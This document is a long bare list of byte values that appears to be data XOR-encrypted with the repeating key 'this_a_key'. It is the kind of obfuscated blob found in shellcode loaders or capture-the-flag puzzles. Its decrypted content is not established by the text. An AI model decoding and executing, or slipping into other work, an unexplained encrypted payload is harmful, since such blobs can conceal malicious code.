158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151,  59, 115,  48,  97,  48, 107,  17, 121,    84, 104,  44, 115,  49,  97,  43, 107,  23, 121,    13, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  73, 107,  96, 121,   139, 151, 150, 140, 160, 158, 160, 148, 102, 121,   116, 104, 105, 122,  93,  97,  95, 107, 101, 121,   180, 104, 105, 115,  95,  97,  95,  45, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   132, 132,  14, 203, 176,  27, 136, 106,  96, 121,   116, 104, 233, 127,  95,  97,  95, 107, 101, 121,   117, 104,  42, 115,  48,  97,  50, 107,  21, 121,    59, 104,  11, 115,  53,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  77,  97,  93, 106, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    26, 104, 105, 115,  95,  97,  95, 107,  50, 121,    27, 104,  27, 115,  59,  97,  27, 107,  10, 121,    23, 104,  28, 115,  50,  97,  58, 107,  11, 121,     0, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 115, 115,  93,  96, 160, 148, 154, 134,   112, 104, 105, 115, 160, 158, 160, 148, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  95, 107,  55, 115,   116, 104, 105, 115,  95,  97,  16, 107,   7, 121,    30, 104,  12, 115,  60,  97,  43, 107,  53, 121,    27, 104,   6, 115,  51,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    98, 104, 104, 114,  94,  97,  95, 107, 103, 121,   116, 104, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 127, 171, 175, 213,   155,  18, 190, 114, 127, 161, 149, 199, 138,   3,   163, 105, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  95, 107, 152, 134,   139, 151, 151, 140, 160, 158, 161, 148, 154, 134,   115, 104, 105, 115,  89,  97,  95, 107,  97, 121,   116, 104,  97, 115,  95,  97,  86, 107, 101, 121,   126, 104, 105, 115, 161, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  90, 107,  54, 121,     1, 104,   4, 115,  50,  97,  62, 107,  23, 121,    13, 104,  32, 115,  49,  97,  57, 107,  10, 121,     6, 104,   4, 115,  62,  97,  43, 107,  12, 121,    27, 104,   7, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,    92, 104, 107, 115, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 121, 115,  95,  97,  25, 106, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 100, 121,   116, 104, 151, 140, 160, 158,  92, 107, 101, 121,   112, 104, 105, 115,  90,  97,  95, 107,  99, 121,   116, 104, 110, 115,  95,  97,  87, 107, 101, 121,   125, 104, 105, 115,  85,  97,  95, 107, 110, 121,   116, 104, 101, 115,  95,  97,  82, 107, 101, 121,   122, 104, 105, 115,  80,  97,  95, 107, 115, 121,   116, 104, 120, 115,  95,  97,  77, 107, 101, 121,   103, 104, 105, 115,  75,  97,  95, 107, 112, 121,   116, 104, 151, 140, 160, 158,  72, 107, 101, 121,   108, 104, 105, 115,  70,  97,  95, 107, 127, 121,   116, 104, 114, 115,  95,  97,  67, 107, 101, 121,   105, 104, 105, 115,  65,  97,  95, 107, 122, 121,   116, 104,  73, 115,  95,  97, 126, 107, 101, 121,    86, 104, 105, 115, 124,  97,  95, 107,  65, 121,   116, 104,  76, 115,  95,  97, 121, 107, 101, 121,    83, 104, 105, 115, 119,  97,  95, 107,  76, 121,   116, 104,  67, 115,  95,  97, 116, 107, 101, 121,    88, 104, 105, 115, 114,  97,  95, 107,  75, 121,   116, 104,  70, 115,  95,  97, 111, 107, 101, 121,    69, 104, 105, 115, 161, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   139, 151, 150, 140, 160, 158, 160, 148, 154, 134,   138, 151, 105, 115,  91,  97,  93, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  94,  97,  95, 107, 133, 252,   235, 154, 144,  60,  55, 113, 244, 250, 109, 121,    95,  79, 218, 170, 111,  97,  95, 107, 115, 120,   116, 104,  99, 115,  95,  97,  88, 107, 101, 121,   236, 104, 105, 115,  93,  97,  95, 107, 203, 121,   116, 104,  97, 115,  95,  97, 224, 107, 101, 121,   117, 104, 105, 115, 148,  97,  95, 107, 106, 121,   116, 104, 184, 115,  95,  97,  79, 107, 101, 121,   173, 104, 105, 115,  77,  97,  95, 107, 132, 121,   116, 104, 103, 115,  95,  97, 163, 107, 101, 121,   125, 104, 105, 115,  91,  96,  95, 107, 118, 121,   116, 104, 103, 114,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   106, 104, 105, 115,  81,  97,  95, 107,  38,  67,    40,  38,   6,   1,  50,   0,  51,  69,   1,  22,     0, 104, 119, 115,  95,  97,  86, 107, 101, 121,    39,  29,  11,  83,  18,  32,  22,  37, 101, 103,   116, 104, 105, 119,  95,  97,  95,  18,  12,  23,   116, 106, 105, 115,  95, 133,  91, 104, 101, 121,   116, 104, 105, 115,  95,  98,  95, 107, 101, 121,   116, 104, 105, 109,  95,  97,  95, 120, 101, 121,   116,  37,   0,  16,  45,  14,  44,   4,   3,  13,    84,  63,   6,   1,  59,  65, 105,  69,  85, 121,   119, 104, 105, 115,  95,  97,  95, 107, 123, 121,   116, 104, 107, 115,  95,  97, 106, 107, 102, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115, 102,  28,  89,  15, 127,  98,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 104, 115, 161, 158,  92,  97, 101, 121,   139, 151, 150, 140,  95, 104,  93, 107, 101, 121,   116, 104, 169, 115,  95,  97,  95, 107, 101,  63,   104, 104, 105, 115,  18,   8,  60,  25,  10,  10,    27,  14,  29,  83,   8,  14,  45,  15,  69,  79,    90,  88,  73,  55,  48,   2,  42,   6,   0,  23,     0, 104,  99, 115,  95,  97,  18,  56,  50,  22,     6,  12,  45,  28,  60,  97,  79, 107, 101, 121,    35,   7,  27,  23, 113,  37,  48,   8,  16,  20,    17,   6,  29,  93, 105,  97, 171,  82, 215,   8,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   168, 205,   1, 115,  26, 161,  86, 111, 101, 121,    81, 104,  12, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  98,  95, 107,  46, 122,   116, 104,  59, 121,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104,  34, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 113,   116, 104, 229, 115,  95,  97,  95,  99, 101, 121,   248, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 229, 123,  95,  97,  95, 107, 101, 121,   248,  96, 105, 115,  95,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,    96, 104, 105, 115, 155, 105,  95, 107, 101, 121,   116, 104, 223, 123,  95,  97,  81, 107, 101, 121,   176,  96, 105, 115,  95,  97,  95, 107, 161, 113,   116, 104, 105, 115,  95,  97, 155,  99, 101, 121,   116, 104, 105, 115, 155, 105,  95, 107, 111, 121,   116, 104, 167, 123,  95,  97,  85, 107, 101, 121,   176,  96, 105, 115,  95,  97,  95, 107, 253, 112,   116, 104,  42, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  52, 112,   116, 104, 105, 115,  95,  97,  14,  98, 101, 121,   116, 104, 105, 115,  14, 104,  95, 107, 101, 121,   116, 104,  56, 122,  95,  97,  95, 107, 101, 121,    37,  97, 105, 115,  95,  97,  95, 107,  52, 112,   116, 104, 119, 115,  95,  97, 132,  98, 101, 121,    44, 104, 105, 115, 108, 107,  95, 107, 122, 121,   116, 104,   6, 122,  95,  97, 118, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 105, 115,  93,  97,  92, 107, 100, 121,   117, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,    27,  97, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 177, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 189, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 229, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 122, 112,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 201, 123,  95,  97,  87, 107, 101, 121,   220,  96, 105, 115,  81,  97,  95, 107, 233, 113,   116, 104, 105, 115,  95,  97, 211,  99, 101, 121,   116, 104, 105, 115, 211, 105,  95, 107, 101, 121,   116, 104, 229, 123,  95,  97,  95, 107, 101, 121,   172,  96, 105, 115,  95,  97,  95, 107, 122, 112,   116, 104, 105, 115,  95,  97, 135,  99, 101, 121,    51, 104, 105, 115, 135, 105,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107,  40,   0,    84,  14,  27,  26,  58,  15,  59,  71,  69,  48,    84,  27,   8,  26,  59,  77, 127,  31,  13,  28,     6,  13,  73,  26,  44,  65,  45,  14,   4,  21,    24,  17,  73,  29,  48,  65,  57,   7,   4,  30,    84,   0,  12,   1,  58,  77, 127,  28,  13,   0,    84,  12,   6,  29, 205,  21, 127,  18,  10,  12,    84,  10,  12,  31,  54,   4,  41,  14,  69,  20,    17,  87, 100,  95, 114,  40, 105,  47,  76,  25,    24,  12,  10,  58,  21, 103, 114,  67,  34, 114,    63,  41,  37,  57,   9, 116,  16,  35,  44,  50,    61,  39,  38,  60,  19, 120,  64, 114, 123,  48,   104, 125, 113, 102,  17,  47,  64,  39, 125,  97,   105, 116, 118,  58,  65, 124,  95, 104, 101, 121,    63, 107, 105, 115, 217,  98,  95, 107, 101, 135,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  93,  20,  94, 105, 101, 122,   116, 104,  34, 112,  95,  97, 161, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  94, 107, 101, 120,   122, 104, 102, 115,  87,  97,  94, 107,  46, 121,   123, 104, 105, 115,  95,  97,  99, 107, 101,  57,   133, 151, 107, 115,  99,  97,  89,  37,  10,  11,    25,   9,   5, 115, 126,  97,  95, 107, 106, 100,   116,  97, 137, 114, 159,  98, 255, 110, 229, 126,    20,  97,  41, 120, 127, 108,  95, 100, 133, 105,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   114, 104,  52, 112,  95,   0,  86, 111, 101, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97, 125, 107,  36,  57,   134, 151, 200, 115, 125,  97,  73,  47,   0,  31,    21,  29,   5,   7, 127,  49,  62,  25,   4,  30,     6,   9,  25,  27, 127,  39,  48,   5,  17, 121,   116, 104, 105, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  20,  97,  95, 107, 102, 121,   139, 151, 150, 140,  92,  97, 160, 148, 154, 134,   117, 104, 109,  83, 160, 158,  94, 107, 101, 121,   116, 104,  34, 115,  95,  97,  95, 107, 101, 121,   116, 104, 105, 115,  95,  97,  20, 107, 101, 121,   116, 107, 169,  82,  56,  